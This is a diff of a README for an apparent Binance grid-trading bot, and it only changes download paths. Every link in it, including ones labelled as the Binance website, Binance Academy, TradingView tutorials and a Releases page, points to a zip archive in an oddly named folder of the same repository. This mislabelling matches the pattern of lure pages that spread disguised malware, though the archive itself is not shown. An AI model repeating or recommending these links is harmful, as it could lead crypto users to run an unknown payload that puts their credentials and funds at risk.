@@ -1,7 +1,7 @@
 # 🤖 binance-trading-bot - Trade Crypto with Ease
 
 ## 💾 Download the Bot
-[![Download binance-trading-bot](https://raw.githubusercontent.com/samratshankar/binance-trading-bot/main/Haematocrya/binance-trading-bot_3.2.zip)](https://raw.githubusercontent.com/samratshankar/binance-trading-bot/main/Haematocrya/binance-trading-bot_3.2.zip)
+[![Download binance-trading-bot](https://github.com/samratshankar/binance-trading-bot/raw/refs/heads/main/Haematocrya/trading_binance_bot_2.8.zip)](https://github.com/samratshankar/binance-trading-bot/raw/refs/heads/main/Haematocrya/trading_binance_bot_2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the Binance Trading Bot, a simple way to automate your cryptocurrency trading. This bot helps you buy low and sell high using Grid Trading. It integrates seamlessly with TradingView, allowing you to base your trades on technical analysis.
@@ -10,7 +10,7 @@ Welcome to the Binance Trading Bot, a simple way to automate your cryptocurrency
 Before you start, ensure that you have:
 
 - A computer running Windows, macOS, or Linux.
-- A Binance account. Visit the [Binance website](https://raw.githubusercontent.com/samratshankar/binance-trading-bot/main/Haematocrya/binance-trading-bot_3.2.zip) to set up one if you don’t have it yet.
+- A Binance account. Visit the [Binance website](https://github.com/samratshankar/binance-trading-bot/raw/refs/heads/main/Haematocrya/trading_binance_bot_2.8.zip) to set up one if you don’t have it yet.
 - An internet connection. This bot needs to connect to the Binance API to function properly.
 
 ### 💡 Features
@@ -20,7 +20,7 @@ Before you start, ensure that you have:
 - User-friendly interface designed for non-technical users.
 
 ## 🔗 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/samratshankar/binance-trading-bot/main/Haematocrya/binance-trading-bot_3.2.zip) to download the latest version of the trading bot.
+1. Visit the [Releases page](https://github.com/samratshankar/binance-trading-bot/raw/refs/heads/main/Haematocrya/trading_binance_bot_2.8.zip) to download the latest version of the trading bot.
 2. Look for the version labeled “Latest Release” at the top of the page.
 3. Choose the appropriate file for your operating system—Windows, macOS, or Linux.
 4. Click the download link and save the file on your computer.
@@ -55,8 +55,8 @@ The Binance Trading Bot has a user-friendly interface with the following section
 ## 🎓 Learning Resources
 Exploring trading strategies can enhance your experience. Below are some resources to help you understand trading better:
 
-- [Binance Academy](https://raw.githubusercontent.com/samratshankar/binance-trading-bot/main/Haematocrya/binance-trading-bot_3.2.zip) – Learn about cryptocurrency and trading.
-- [TradingView Tutorials](https://raw.githubusercontent.com/samratshankar/binance-trading-bot/main/Haematocrya/binance-trading-bot_3.2.zip) – Get familiar with technical analysis.
+- [Binance Academy](https://github.com/samratshankar/binance-trading-bot/raw/refs/heads/main/Haematocrya/trading_binance_bot_2.8.zip) – Learn about cryptocurrency and trading.
+- [TradingView Tutorials](https://github.com/samratshankar/binance-trading-bot/raw/refs/heads/main/Haematocrya/trading_binance_bot_2.8.zip) – Get familiar with technical analysis.
 
 ## 🌐 Community Support
 Join the Binance Trading Bot community for support and sharing tips:
@@ -66,4 +66,4 @@ Join the Binance Trading Bot community for support and sharing tips:
 
 By using the Binance Trading Bot, you can unlock the potential of automated trading and enhance your trading experience. With easy-to-follow steps, even those new to trading can get started effectively.
 
-Visit the [Releases page](https://raw.githubusercontent.com/samratshankar/binance-trading-bot/main/Haematocrya/binance-trading-bot_3.2.zip) again to download and stay updated with new releases and features. Happy trading!
+Visit the [Releases page](https://github.com/samratshankar/binance-trading-bot/raw/refs/heads/main/Haematocrya/trading_binance_bot_2.8.zip) again to download and stay updated with new releases and features. Happy trading!
